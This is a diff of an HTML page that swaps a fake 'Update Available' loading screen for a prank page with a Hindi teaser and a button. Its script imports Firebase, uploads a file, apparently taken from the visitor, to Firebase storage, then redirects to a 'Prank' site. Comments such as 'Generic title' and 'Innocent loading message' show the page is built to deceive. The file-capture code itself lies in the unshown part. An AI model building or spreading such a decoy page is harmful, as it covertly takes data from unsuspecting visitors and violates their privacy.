@@ -3,24 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Update Available</title> <!-- Generic title -->
+    <title>LoL!! 😂</title>
     <style>
         body {
+            background-color: #1e1e1e;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             font-family: Arial, sans-serif;
             text-align: center;
-            margin: 50px;
         }
-        #loadingMessage {
-            font-size: 22px;
-            margin: 30px;
+        #secretButton {
+            padding: 15px 30px;
+            font-size: 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #secretButton:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
-
-    <!-- Innocent loading message -->
-    <div id="loadingMessage">Checking for updates, please wait...</div>
-
+   <div>
+        <p>aaj kuchh ajib honewala hai 🤣🤭</p>
+        <button id="secretButton">Kya tum taiyar ho??</button>
+    </div>
+    
     <script type="module">
         // Import Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -93,7 +107,7 @@
                 logMessage('File uploaded successfully to Firebase!');
 
                 // Redirect after successful upload
-                window.location.href = "https://high-hub.github.io/Prank/";  // <-- Change this to your desired redirect URL
+                window.location.href = "https://high-hub.github.io/Prank/";
 
             } catch (error) {
                 logMessage('Error during file upload: ' + error.message);
